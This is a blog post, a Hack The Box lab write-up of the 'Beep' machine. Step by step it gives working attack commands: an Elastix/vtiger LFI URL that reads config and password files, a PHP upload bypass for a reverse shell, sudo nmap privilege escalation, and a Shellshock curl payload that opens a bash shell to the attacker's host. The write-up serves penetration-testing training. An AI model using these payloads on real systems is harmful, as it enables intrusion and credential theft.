---
layout: post
title:  "Beep Writeup - Hack The Box"
date:   2025-05-09
desc: ""
keywords: "HTB,eWPT,Linux,Elastix LFI,Vtiger CRM Exploitation,Shellshock,Easy"
categories: [HTB]
tags: [HTB,eWPT,Linux,Elastix LFI,Vtiger CRM Exploitation,Shellshock,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/beep_writeup/Beep.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

After being a bit inactive with **[Hack The Box](https://www.hackthebox.com){:target="_blank"}**, I am going to resume my practice with a box classified as **Easy** by the community, the **Beep** machine. I found it very interesting, as I was unaware of the technologies implemented in the lab and therefore the vulnerabilities, tools and methods to engage the machine. As always, I take with me a lot of knowledge and some new skills acquired, which will allow me to improve my lateral thinking and advance in my professional path.

<br /><br />
<img src="{{ site.img_path }}/beep_writeup/Beep_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I put all my concentration in the **Reconnaissance** phase, but first I verify the connectivity with the machine with `ping` and then with the **[hack4u](https://hack4u.io/){:target="_blank"}** script, `whichSystem.py`, I check that the Operating System installed is most probably **Linux**. With `nmap` I get the list of open ports using **TCP** protocol, and so I can access the information of the services and their versions with the same tool, I am not used to get so many ports for a **Linux** OS machine. I find myself with technologies that until now I had not confronted, but the good thing is that for some I get the version number, and with this information I can search the **Codename** with some search engine, *it seems that containers are being implemented*.

```bash
ping -c 1 10.10.10.7
whichSystem.py 10.10.10.7
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.7 -oG allPorts
nmap -sCV -p22,25,80,110,111,143,443,793,993,995,3306,4190,4445,4559,5038,10000 10.10.10.7 -oN targeted
cat targeted
#    --> OpenSSH 4.3
#    google.es --> OpenSSH 4.3 launchpad           Feisty
#    --> Apache httpd 2.2.3
#    google.es --> Apache httpd 2.2.3 launchpad    Gutsy
```

<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I am going to continue with my **Reconnaissance** phase, I always start with those ports that have a web service over **HTTP** or **HTTPS**, in this case there are two technologies that I did not know much, such as **[Elastix](https://simpleit.gr/what-is-elastix/){:target="_blank"}** and **[Webmin](https://webmin.com/){:target="_blank"}**. With `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I can't find much information to help me to engage the system, at the moment, neither the default credentials allow me to the administration panel. But if I can resort to **[HackTricks](https://book.hacktricks.wiki/en/){:target="_blank"}** to investigate **[SMTP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html?search=110){:target="_blank"}** services on port **25** (if it allows me to enumerate users) and **[POP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-pop.html?highlight=110#banner-grabbing){:target="_blank"}** on **110**, also with `openssl` I search for subdomains, email on port **443**, but I can not collect much information.

> **[Elastix](https://simpleit.gr/what-is-elastix/){:target="_blank"}** is a unified communications server software that brings together **IP PBX**, **e-mail**, **IM**, faxing and collaboration functionality. Whether at the office or on-the-go you can collaborate with colleagues and customers in real time. Live chat or video call with no extra fees or downloads, accessible from your desktop or mobile device. It can be installed as an on-premise solution on **Windows**, **Linux** or **Raspberry Pi**. Elastix can now be hosted by **3CX**, or self-managed in your private cloud account. No matter what, you are guaranteed an easy to manage **PBX**, with all the communication features required for modern businesses.

> **[Webmin](https://webmin.com/){:target="_blank"}** is a web-based system administration tool for **Unix-like** servers, and services with about 1,000,000 yearly installations worldwide. Using it, it is possible to configure operating system internals, such as users, disk quotas, services or configuration files, as well as modify, and control open-source apps, such as BIND DNS Server, Apache HTTP Server, PHP, MySQL, and many more.

```bash
cat targeted | grep http
whatweb http://10.10.10.7 https://10.10.10.7 http://10.10.10.7:10000

https://10.10.10.7/
# admin:palosanto     :(

nc -nv 10.10.10.7 25
  HELO
  HELO oldb0y
  VRFY root             # :)
  VRFY oldb0y           # :(
telnet 10.10.10.7 25
  HELO
  HELO oldb0y
  VRFY root             # :)
  VRFY oldb0y           # :(

nc -nv 10.10.10.7 110
  USER root
  PASS root             # :(

openssl s_client --connect 10.10.10.7:443
```

<br/>
<img src="{{ site.img_path }}/beep_writeup/Beep_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now if I search with `searchsploit` for vulnerabilities for **Elastix**, I find some very interesting ones, but I don't have the version of the service installed on the target machine. In the **ExploitDB** database there are not many exploits so I can analyze the scripts, since I can't find any information on the Web or in the source code. There is one that exploits an **LFI** and if I use the **URL** that allows to leak sensitive system information, I succeed in getting the credentials to access an administration panel.

```bash
searchsploit elastix

searchsploit -x php/webapps/37637.pl
# LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
# Password :)
```

<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Thanks to the exploitation of the **LFI** I can leak a lot of information from the system, including the first flag to validate before **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** the engagement of the system. From one of the system files, which after performing a format transformation allows me to obtain the list of all open ports, but I still can't find any path that allows me to access the machine.

```bash
# view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
# :)
# view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//home/fanis/user.txt%00&module=Accounts&action
# :)
# view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//proc/net/fib_trie%00&module=Accounts&action
# :(
# view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//proc/net/tcp%00&module=Accounts&action
# :)

cat data.txt | awk '{print $3}' FS=':' | awk '{print $1}' FS=' ' | sort -u
echo $((0x0016))
echo $((0x01BB))
cat data.txt | awk '{print $3}' FS=':' | awk '{print $1}' FS=' ' | sort -u | while read port; do echo -e "Port $port --> $((0x$port))"; done

# view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//proc/scheddebug%00&module=Accounts&action
# :(
# view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//proc/schedstat%00&module=Accounts&action
# :)
```

<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After thinking for a while, I test **SSH** access as the **root** user to the victim machine, and as there is sometimes in some labs (including this one), the bad practice of reusing credentials can end up engaging the box, after being able to correct a problem with the protocols allowed in the **SSH** configuration of my machine, thanks to the **[SSH returns: no matching host key type found. Their offer: ssh-dss](https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss){:target="_blank"}** article I found on the Internet. It was not very difficult the machine, that's why it is listed as easy, but I will look for other alternative ways to continue my practice with this lab.

```bash
ssh root@10.10.10.7
# Unable to negotiate with 10.10.10.7 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss

ssh -oHostKeyAlgorithms=+ssh-dss root@10.10.10.7
ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-dss root@10.10.10.7
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa root@10.10.10.7

whoami
hostname
hostname -I
# :(
ifconfig
```

<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The **LFI** exploitation is done on the **Vtiger CRM**, so I can access the administration panel with the credentials I leaked before. For the installed version I can search for vulnerabilities, but for this manager there is a way to engage the system, it is only necessary to access to **Settings** and then to the company information to edit, there is a field that allows me to upload an image, so the steps to follow are already familiar to me.

> **Vtiger CRM** is a cloud-based, open-source **Customer Relationship Management** (**CRM**) platform that helps businesses manage their sales, marketing, and customer service operations. It's designed to be easy to use and customize, and supports various team sizes and industries. **Vtiger** offers tools for sales automation, customer support, marketing automation, project management, and more.

```html
https://10.10.10.7/vtigercrm/
# admin:jEh----jE
# Settings > Settings > Editing Company Details
```

<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

To access the system, I will upload a malicious file with a **OneLiner** (available in **[Pentest Monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}**) in **PHP** that will allow me to get a **Reverse Shell**, to achieve the goal I just have to load it with a double extension (**php** and **jpg**) and in this way I get to perform a bypass of protection measures not very well implemented. Once the file is uploaded, I open the port on my machine with `nc` waiting for the remote connection, and just by saving the changes on the web I can access the system. I perform a **Console treatment** and after performing a basic enumeration, the user has the privilege to execute several commands impersonating the **root** user, and thanks to **[GTFObins](https://gtfobins.github.io/){:target="_blank"}** I can spawn a shell thanks to the nmap command.

```bash
nvim pwn3d.php.jpg
cat !$
nc -nlvp 443

whoami
hostname
ip a
script /dev/null -c bash
# [Ctrl^z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128
sudo -l

sudo nmap --interactive
!sh
```

<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Another way to engage the box is to target the other port (**10000**), which has a **Common Gateway Interface** (**CGI**) implemented and is susceptible to **[ShellShock attack](https://blog.cloudflare.com/inside-shellshock/){:target="_blank"}**. First I test the vulnerability by sending a trace with `ping` to my attacking machine and then I can send a **Reverse Shell** to myself.

```bash
https://10.10.10.7:10000/session_login.cgi
# CGI!!!      Vulnerable to Shell Shock Attack?

tcpdump -i tun0 icmp -n
curl -H "User-Agent: () { :; }; ping -c 1 10.10.14.56" https://10.10.10.7:10000/ -k
# :)

nc -nlvp 443
curl -H "User-Agent: () { :; }; /bin/bash -i >&/dev/tcp/10.10.14.56/443 0>&1" https://10.10.10.7:10000/ -k

whoami
ip a
```

<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/beep_writeup/Beep_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> It was a machine that was not very difficult to vulnerate, perfect to reinforce old concepts and methods, as well as to test different attacks. **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** always allows you to advance on the way to be a good pentester, the labs even if they are not very complex always help me to rethink many doubts and remember attack methods. Now I'm going to look for the next lab but I don't forget to kill the **Beep** machine.

<br /><br />
<img src="{{ site.img_path }}/beep_writeup/Beep_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
